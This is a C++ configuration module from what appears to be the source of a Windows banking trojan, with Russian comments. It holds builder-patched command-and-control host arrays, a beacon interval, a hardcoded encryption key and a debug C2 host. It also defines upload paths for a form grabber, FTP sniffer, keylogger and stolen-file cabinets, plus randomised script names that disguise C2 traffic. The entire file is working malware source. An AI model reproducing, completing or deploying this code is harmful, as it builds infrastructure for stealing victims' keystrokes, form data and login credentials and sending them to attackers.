#include <windows.h>

#include "Config.h"
#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "Crypt.h"
#include "BotHosts.h"
#include "BotClasses.h"

#include "Modules.h"

#include "BotDebug.h"
namespace Config
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define MDBG_Config Config::DBGOutMessage<>



#ifndef DEBUGCONFIG
//=============================================================================
//  Параметры которые должны бать вшиты билдером бота
//=============================================================================


	//****************************************************************************
	//  Массив хостов.
	//  Записывать только имена хостов, без протоколов, путей, разделителей
	//
	//  Каждый хост должен ограничиваться нулевым символом, после последнего хоста
	//  должно стоять два нулевых символа. Не допускаются никакие дополнительные
	//  символы - пробелы, табуляции и т.д
	//
	//  host1.com\0host2.com\0host3.com\0\0
	//****************************************************************************
	char BOT_HOSTS_ARRAY[MAX_HOSTS_BUF_SIZE] = "ALL_HOSTS_BUFFER\0";

	#define HASH_EMPTY_HOSTS_BUF  0xE98F4C1C /* ALL_HOSTS_BUFFER */


	//char MainHost_1[MAX_HOST_SIZE + 1] = "FULL_URL_1\0";
	//char MainHost_2[MAX_HOST_SIZE + 1] = "FULL_URL_2\0";
	//char MainHost_3[MAX_HOST_SIZE + 1] = "FULL_URL_3\0";

	//----------------------------------------------------------------------------
	// Интервал отстука (в минутах). Строковое значение
	//----------------------------------------------------------------------------
	char Delay[MAX_DELAY_SIZE + 1]  = "DELAY_\0";

	//----------------------------------------------------------------------------
	// Префикс бота
	//----------------------------------------------------------------------------
	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "BOT_UID\0";


	//----------------------------------------------------------------------------
	// Основной пароль бота. Весь трафик будет шифроваться этим паролем
	//----------------------------------------------------------------------------
	char MainPassword[MAX_PASSWORD_SIZE + 1] = "MAIN_PASSWORD\0";
	#define MainPasswordNameHash 0x618ADDBE /*MAIN_PASSWORD*/


//=============================================================================
#endif

//----------------------------------------------------------------------------
// Стандартный пароль, будет использоваться только в случаях
// когда требуется основной пароль, но он не указан
//----------------------------------------------------------------------------
const char DefaultPassword[] = {'K', '8', 'D', 'F', 'a', 'G', 'Y', 'U', 's', '8', '3', 'K', 'F', '0', '5', 'T',  0};;



// Адреса скриптов
#ifndef CryptHTTPH
	const static char PathTask[]        = {'/','s','e','t','/','t','a','s','k','.','h','t','m','l', 0};
	const static char PathFirstInfo[]   = {'/','s','e','t','/','f','i','r','s','t','.','h','t','m','l',0};
	const static char PathFormGrabber[] = {'/','g','e','t','/','f','g','r','.','h','t','m','l',0};
	const static char PathFTPSniffer[]  = {'/','g','e','t','/','s','n','i','.','h','t','m','l',0};
	const static char PathGrabber[]     = {'/','g','e','t','/','g','r','a','.','h','t','m','l',0};
	const static char PathComment[]     = {'/', 's', 'e', 't', '/', 'c', 'o', 'm', 'm', 'e', 'n', 't', '.', 'h', 't', 'm', 'l',  0};
	const static char PathPluginsList[] = {'/', 's', 'e', 't', '/', 'c', 'f', 'g', 's', '.', 'h', 't', 'm', 'l',  0};
	const static char PathKeylogger[]   = {'/', 'g', 'e', 't', '/', 'k', 'e', 'y', '.', 'h', 't', 'm', 'l',  0};
    const static char PathCab[]         = {'/','g','e','t','/','c','a','b','.','h','t','m','l' ,0};
	const static char PathPlugins[]     = {'/','s','e','t','/','p','l','u','g','s','.','h','t','m','l',0};

	#ifdef HunterH
		const static char PathHunter[]  = {'/','s','e','t','/','h','u','n','t','e','r','.','h','t','m','l',0};
	#endif
#endif

const static char PathConfig[]      = {'/','c','f','g','/',0};



// Расширения доступные для папки SET
const static PCHAR SETFolderExts[] = {".phtml", ".php3", ".phtm", ".inc", ".7z"};

// Расширения доступные для папки GET
const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".rar"};


#ifdef DEBUGCONFIG

	char DebugHost[255]	  = "rus.gipa.in\0";
	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
	char DebugBotPrefix[] = "test\0";
	PCHAR DebugDelay      = "1\0";

#endif



char *GetPrefix()
{
	// Функция возвращает префикс бота
	#ifdef DEBUGCONFIG
		return DebugBotPrefix;
	#else
		return  Decrypt(BOT_PREFIX);
	#endif
}


//-----------------------------------------------------------------------------
#ifdef CryptHTTPH
	PCHAR GetScriptByID(DWORD ID, bool &Created)
	{
		// Функция возвращает адреса скриптов в версии бота, которая
		// поддерживает шифрование и защиту алресов
		Created = true;
		DWORD Min1, Max1, Min2, Max2;
        bool IsGetScript = false;

		#define RANGE(IsGet, Mn1, Mx1, Mn2, Mx2) {Min1 = Mn1; Max1 = Mx1; \
												  Min2 = Mn2; Max2 = Mx2; \
												  IsGetScript = IsGet; \
												  break;}

        // Определяем границы скрипта
		switch (ID) {
			// Скрипты из папки GET
			case SCRIPT_FORM_GRABBER: RANGE(true, 1, 3, 24, 26);
			case SCRIPT_GRABBER:      RANGE(true, 4, 6, 27, 30);
			case SCRIPT_FTP_SNIFFER:  RANGE(true, 7, 9, 31, 33);
			case SCRIPT_CAB:          RANGE(true, 10, 12, 34, 36);
//            case SCRIPT_CAB_PART:     RANGE(true, 13, 15, 37, 39);
			case SCRIPT_KEYLOGGER:    RANGE(true, 16, 18, 40, 42);
//			case SCRIPT_SCREENSHOT:   RANGE(true, 22, 24, 46, 48);


			// Скрипты из папки SET
			case SCRIPT_TASK:         RANGE(false, 1, 6, 18, 24);
			case SCRIPT_FIRST_INFO:   RANGE(false, 7, 12, 25, 30);
			case SCRIPT_PLUGINS:      RANGE(false, 13, 17, 31, 36);
			case SCRIPT_COMMENT:      RANGE(false, 37, 48, 37, 48);
			case SCRIPT_HUNTER:       RANGE(false, 49, 56, 48, 56);
			case SCRIPT_PLUGINS_LIST: RANGE(false, 57, 64, 57, 64);


		default:
            return NULL;
		}


		// Генерируем путь

		DWORD ExtCount = 0;
		if (IsGetScript)
			ExtCount = sizeof(GETFolderExts) / sizeof(PCHAR);
		else
			ExtCount = sizeof(SETFolderExts) / sizeof(PCHAR);

		PCHAR *Exts = NULL;
		if (IsGetScript)
			Exts = (PCHAR*)&GETFolderExts[0];
		else
			Exts = (PCHAR*)&SETFolderExts[0];

		return GenerateRandomScript(Min1, Max1, Min2, Max2, ExtCount, Exts);

	}
//-----------------------------------------------------------------------------

#else

	PCHAR GetScriptByID(DWORD ID, bool &Created)
	{
		MDBG_Config("Config","GetScriptByID");
		// Функция возвращает адреса скриптов в версии бота, которая не
		// поддерживает шифрование
		Created = false;
		switch (ID)
		{
			case SCRIPT_FORM_GRABBER: return (PCHAR)PathGrabber;
			case SCRIPT_TASK:         return (PCHAR)PathTask;
			case SCRIPT_FIRST_INFO:   return (PCHAR)PathFirstInfo;
			case SCRIPT_PLUGINS:      return (PCHAR)PathPlugins;
			case SCRIPT_FTP_SNIFFER:  return (PCHAR)PathFTPSniffer;
			case SCRIPT_GRABBER:      return (PCHAR)PathGrabber;

			#ifdef HunterH
			case SCRIPT_HUNTER: return (PCHAR)PathHunter;
			#endif

			case SCRIPT_COMMENT:      return (PCHAR)PathComment;
			case SCRIPT_PLUGINS_LIST: return (PCHAR)PathPluginsList;
			case SCRIPT_KEYLOGGER:    return (PCHAR)PathKeylogger;
			case SCRIPT_CAB:          return (PCHAR)PathCab;
		}
		return NULL;

	}

#endif
//-----------------------------------------------------------------------------


int GetDelay()
{
	MDBG_Config("Config","GetDelay");
	PCHAR Str = NULL;
	#ifdef DEBUGCONFIG
		Str = DebugDelay;
	#else
		Str = Delay;
	#endif

	int V = 0;
	if (Str != NULL)
		V = m_atoi(Str);

	if (V == 0)
		V = DEFAULT_DELAY;

	return V;
}

#ifdef DEBUGCONFIG
	// В отладочном режиме предоставляем возможность установить отладочный хост
	void SetDebugHost(PCHAR Host)
	{
		MDBG_Config("Config","SetDebugHost");
		
		if (!StrCopy(DebugHost, Host))
        	StrCopy(DebugHost, "localhost");
	}
#endif


//-----------------------------------------------------------------------------
PCHAR GetActiveHost()
{
	MDBG_Config("Config","GetActiveHost");
	// Функция возвращает активный (доступный) хост
	#ifdef DEBUGCONFIG
		return STR::New(DebugHost);

	#else
		PCHAR Result  = NULL;

    	// Первым этапом пытаемся получить хост из файла
		if (Hosts::GetActiveHostFormFile(NULL, Result))
            return Result;

        // Перебираем вшитые хосты
		if (CalcHash(BOT_HOSTS_ARRAY) == HASH_EMPTY_HOSTS_BUF)
		{
			// Хосты не вшиты
			return NULL;
		}

		PCHAR Host = BOT_HOSTS_ARRAY;
		while (*Host != 0)
		{
			// декриптуем хост и проверяем его
			Result = STR::New(Decrypt(Host));
			if (Hosts::CheckHost(Result))
				return Result;

			STR::Free(Result);

			// переходим на другой элемент
			Host = STR::End(Host);
			Host++;
		}

		return NULL;
	#endif
}
//-----------------------------------------------------------------------------

PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
{
	MDBG_Config("Config","GetBotScriptURL");
	// Функция возвращает полный адрес скрипта
	bool PathCreated = false;

	if (STR::IsEmpty(Path))
		Path = GetScriptByID(Script, PathCreated);


	if (STR::IsEmpty(Path))
		return NULL;
	

	PCHAR Host = GetActiveHost();

	PCHAR Result = NULL;

	if (Host != NULL)
	{
		Result = STR::New(3, "http://", Host, Path);

		STR::Free(Host);
	}

	if (PathCreated)
		STR::Free(Path);


	return Result;
}
//----------------------------------------------------------------------------


// Функция возвращает пароль для криптования принимаемых/отправляемых данных

PCHAR GetMainPassword(bool NotNULL)
{
	
	// Функция возвращает пароль шифрования
	PCHAR Passw = NULL;
	#ifdef DEBUGCONFIG
		Passw = STR::New(DebugPassword);
	#else
		// Проверяем задан ли в боте пароль
		if (CalcHash(MainPassword) != MainPasswordNameHash)
		{
			Passw = STR::Alloc(StrCalcLength(MainPassword));
			Decrypt(MainPassword, Passw);
		}
	#endif

	// В случае необходимости возвращаем cтандартный пароль
	if (NotNULL && STR::IsEmpty(Passw))
	{
    	Passw = STR::New((PCHAR)DefaultPassword);
    }

//	MDBG_Config("Config",Passw);
	return Passw;
}
//----------------------------------------------------------------------------

PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD ExtsCount, PCHAR *Exts)
{
	MDBG_Config("Config","GenerateRandomScript");
	// Функция генерирует случайное имя скрипта
	DWORD Sz = 0;
	if (Random::Generate(0, 1000) < 500)
		Sz = Random::Generate(Min1, Max1);
	else
		Sz = Random::Generate(Min2, Max2);

	PCHAR Name = Random::RandomString(Sz, 'a', 'z');

	// Добавляем расширение скрипта

	DWORD ExtPos = Random::Generate(1, ExtsCount);
	for (DWORD i = 1; i < ExtPos; i++, Exts++);
	PCHAR Ext = *Exts;

	PCHAR Script = STR::New(3, "/", Name, Ext);

	STR::Free(Name);

    return Script;
}
//----------------------------------------------------------------------------

DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
{
	MDBG_Config("Config","GetBotParameter");
	//  Функция возвращает парметр бота
	if (Buffer != NULL && BufSize == 0)
		return 0;

	PCHAR Value = NULL;

	#ifdef DEBUGCONFIG
		switch (ParamID) {
			case BOT_PARAM_PREFIX: Value = DebugBotPrefix;  break;
			case BOT_PARAM_HOSTS:  Value = DebugHost; break;
			case BOT_PARAM_KEY:    Value = DebugPassword; break;
			case BOT_PARAM_DELAY:  Value = DebugDelay; break;
		default: return 0;;
		}
	#else
		switch (ParamID) {
			case BOT_PARAM_PREFIX: Value = BOT_PREFIX;  break;
			case BOT_PARAM_HOSTS:  Value = BOT_HOSTS_ARRAY; break;
			case BOT_PARAM_KEY:    Value = MainPassword; break;
			case BOT_PARAM_DELAY:  Value = Delay; break;
		default: return 0;;
		}
	#endif

	if (Value == NULL)
		return 0;

	// Лпределяем размер параметра
	DWORD Size = 0;

	if (ParamID == BOT_PARAM_HOSTS)
	{
		#ifdef DEBUGCONFIG
			 Size = StrCalcLength(Value) + 2;
		#else
			 Size = STR::CalcDoubleZeroStrLength(Value);
		#endif
	}
	else
		Size = StrCalcLength(Value);


	if (Buffer == NULL)
		return Size;


	// Копируем значение
	m_memset(Buffer, 0, BufSize);

	if (BufSize < Size)
	{
		if (ParamID == BOT_PARAM_HOSTS)
            Size = BufSize - 2;
		else
			Size = BufSize - 1;
    }

	DWORD ToCopy = Size;


	#ifdef DEBUGCONFIG
		if (ParamID == BOT_PARAM_HOSTS)
			ToCopy -= 2;
	#endif

    m_memcpy(Buffer, Value, ToCopy);


	#ifdef DEBUGCONFIG
		// Шифруем открытые данные
		if (ParamID == BOT_PARAM_HOSTS ||
			ParamID == BOT_PARAM_PREFIX ||
			ParamID == BOT_PARAM_KEY)
		{
			Decrypt(Buffer, Buffer);
		}
	#endif


	return Size;
}
//----------------------------------------------------------------------------

BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
{
	MDBG_Config("Config","SetBotParameter");
	#ifdef DEBUGCONFIG
		return FALSE;
	#else
		if (STR::IsEmpty(Param))
			return FALSE;

		DWORD Size = 0;    // Размер  устанавливаемого параметра
		LPVOID Buf = NULL; // Приёмный буфер
		DWORD Max = 0;     // Максимально допустимый размер

		if (ParamID != BOT_PARAM_HOSTS)
            Size = StrCalcLength(Param);

		// Определяем приёмный буфер и размер параметра

		switch (ParamID) {

			// Устанавливается префикс бота
			case BOT_PARAM_PREFIX:
				{
					Buf = BOT_PREFIX;
					Max = MAX_PREFIX_SIZE;
					break;
				}

			// Устанавливаем хосты
			case BOT_PARAM_HOSTS:
				{
                    Size = STR::CalcDoubleZeroStrLength(Param);
					Buf = BOT_HOSTS_ARRAY;
					Max = MAX_HOSTS_BUF_SIZE;
					break;
				}

			// Устанавливаем ключ шифрования
			case BOT_PARAM_KEY:
				{
					Buf = MainPassword;
					Max = MAX_PASSWORD_SIZE;
					break;
				}

			// Устанавливаем задержку
			case BOT_PARAM_DELAY:
				{
					Buf = Delay;
					Max = MAX_DELAY_SIZE;
					break;
				}

		default: return FALSE;;
		}


		// Устанавливаем параметр
		if (Size == 0 || Buf == NULL || (Max != 0 && Size > Max))
			return FALSE;

        m_memset(Buf, 0, Max);
        m_memcpy(Buf, Param, Size);
        return TRUE;
	#endif
}
//----------------------------------------------------------------------------
